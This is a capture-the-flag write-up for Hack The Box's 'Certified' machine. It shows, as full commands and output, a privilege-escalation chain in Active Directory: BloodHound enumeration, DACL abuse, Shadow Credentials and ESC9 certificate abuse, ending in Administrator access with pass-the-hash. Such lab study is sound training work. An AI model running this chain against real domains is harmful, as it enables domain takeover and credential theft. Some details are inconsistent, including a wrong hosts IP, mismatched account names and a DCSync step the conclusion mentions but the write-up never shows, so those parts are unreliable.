# Certified - HTB Labs Writeup

**Machine:** Certified (Hack The Box)

**Difficulty:** Medium

<img width="1026" height="210" alt="certified" src="https://github.com/user-attachments/assets/ce6b1232-5898-467f-933e-7ac099dcea4f" />

## Background / Scope
- **Target IP:** `10.10.11.41`
- **Goal:** Obtain `user.txt` and `root.txt` (or Administrator) on the machine in a lab environment.
- **Machine Info:** As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: `judith.mader` Password: `judith09`

## Target enumeration (nmap)

I'll run nmap command to discover open ports/services and versions.

```bash
nmap -sC -sV 10.10.11.41 -Pn
```

```text
# nmap -sC -sV 10.10.11.41 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 10:10 EDT
Nmap scan report for certified.htb (10.10.11.41)
Host is up (0.34s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-30 21:11:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-30T21:12:49+00:00; +7h00m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
|_ssl-date: 2025-10-30T21:12:48+00:00; +7h00m32s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-30T21:12:49+00:00; +7h00m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
|_ssl-date: 2025-10-30T21:12:48+00:00; +7h00m32s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m31s, deviation: 0s, median: 7h00m31s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-30T21:12:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.44 seconds
```

We see domain name shows up `certified.htb`, `dc01.certified.htb`.So I'll add in our `/etc/hosts` file.


```text
10.10.16.4    certified.htb dc01.certified.htb
```

I try to find out what service I can run with our provided credentials

```text
# crackmapexec smb 10.10.11.41 -u judith.mader -p judith09 
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
```




```text
└─# crackmapexec winrm 10.10.11.41 -u judith.mader -p judith09 
SMB         10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
HTTP        10.10.11.41     5985   DC01             [*] http://10.10.11.41:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.41     5985   DC01             [-] certified.htb\judith.mader:judith09
```

WinRM does not work,that means we have to work with user low privileges.


## SMB Enumeration


Let's take a look to SMB service

```text
└─# smbclient -L //10.10.11.41/ -U "judith.mader%judith09"

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.41 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The output shows there is nothing interesting here.Standart shares

## BloodHound 

I'll run `bloodhound-python` command to collect the data

```text
bloodhound-python -u 'judith.mader' -p 'judith09' -d certified.htb -ns 10.10.11.41 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.certified.htb:88)] [Errno 113] No route to host
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
```

Don't forget to run `neo4j` for using BloodHound GUI

```bash
neo4j console
```

I'll open up BloodHound GUI and search for user `judith.mader`.I'll mark our user as Owned
I'll find `judith.mader`.Then I'll go to the "Outbound Object Control"


<img width="768" height="309" alt="2" src="https://github.com/user-attachments/assets/33e15a9a-eefc-454d-a53a-c74e11894b16" />

Our user has `WriteOwner` rights on `MANAGEMENT@CERTFIED.HTB` group.So I'll go further and find out very interesting path:


<img width="800" height="206" alt="2" src="https://github.com/user-attachments/assets/64878ed5-ec01-4ebd-9840-c68aa6e92e58" />

Click on the edge in BloodHound from Judith.Mader to Management group.There is section how to abuse with Linux

## Modyfing rights

To change the ownership of the object, you may use Impacket's dacledit example script (cf. "grant ownership" reference for the exact link).
```text
dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20241027-152313.bak
[*] DACL modified successfully!
```
Now we have the rights to add user

```bash

net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

Next, I'll check our user is there:

```text
net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
CERTIFIED\judith.mader
CERTIFIED\management_svc
```

## Abusing `MANAGEMENT_SVC`



<img width="821" height="266" alt="5" src="https://github.com/user-attachments/assets/d8da5a30-a7c7-472f-84ce-617a7c057a0f" />


As you can see, we have `GenericAll` rights over `MANAGEMENT_SVC`.I suggest to use `certipy` for Shadow Credentials:

```text
certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '91c77677-13a9-3225-4533-8a5ec50d7c90'
[*] Adding Key Credential with device ID '91c77677-13a9-3225-4533-8a5ec50d7c90' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '91c77677-13a9-3225-4533-8a5ec50d7c90' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```
Now I got `management_svc` NT hash

## WinRM as `MANAGEMENT_SVC` group

```text
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\desktop> type user.txt
5b5f382a************************
```

## Authentication as "CA_SVC"

I have `GenericAll` over `CA_SVC`,so I can `Shadow Credential` as you can see above, where we can Shadow credentials for `Management_SVC`

```text
certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290'
[*] Adding Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID 'f5ac7402-4dde-7555-6b4b-a460f7fd1290' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

```test
crackmapexec winrm dc01.certified.htb -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
SMB         10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
HTTP        10.10.11.41     5985   DC01             [*] http://10.10.11.41:5985/wsman
WINRM       10.10.11.41     5985   DC01             [-] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2
```

As you can see, we can't auth as `CA_OPERATOR`.So I didn't find any other way.In this situation I always prefer to use `certipy` for enumerating ADCS

## Enumeration ADCS

```test
certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

## ESC9 Vulnerbility 

ESC9 is an enumeration/abuse pattern against Active Directory Certificate Services (AD CS) where an attacker who controls or can modify Certificate Authority (CA) objects, certificate templates, or enrollment permissions can obtain a certificate that effectively grants the attacker the privileges of a high-value account (for example a Domain Admin). Because certificates issued by a trusted enterprise CA are accepted for authentication (PKINIT, smartcard logon, or certain service authentications), abusing AD CS in this way is a reliable escalation path to full domain compromise.


ESC9 requires these conditions:

- ```StrongCertificateBindingEnforcement``` not set to `2` (default: `1`) or `CertificateMappingMethods` contains `UPN` flag
- Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag value`
- Certificate specifies any client authentication EKU


Also we need to have `GenericWrite` rights over another account
We just need to change our account `UPN` flag to `Administrator`, it gets conflict with legit `Administrator` account and after that I'll request certification for Administrator account.


To do this I'll use `certipy`

```text
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

Now I request certification for `ca_operator` certification using our vulnerbility:

```text
certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

I successfully got certification of `Administrator`,but...

certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

I'll notice that our `UPN` is `Administrator` and there is no any SID in the certificate so I'll change back my upn to `ca_operator`

```text
certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

After that, I'll use our certificate to get Administrator hash

```text
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

## Auth as Administrator

Now I finally have Administrator access

```text
evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
                                        
Evil-WinRM shell v3.7          
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
909a1******************
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Conclusion

The Certified box demonstrates a common and realistic Active Directory escalation chain: a low-privilege service account (management_svc) with write/modify rights over higher-value objects can be leveraged to abuse AD Certificate Services and obtain full domain control. In this engagement we moved from an initial foothold on management_svc to control over CA-related objects, used that control to request/issue a certificate for a privileged identity (AD CS / ESC9 abuse), and then leveraged that certificate to authenticate as a high-privilege account and perform domain-level actions (including DCSync). Compared to purely “graphical” BloodHound paths, the AD CS route here was the most practical and reliable escalation vector in the target environment.
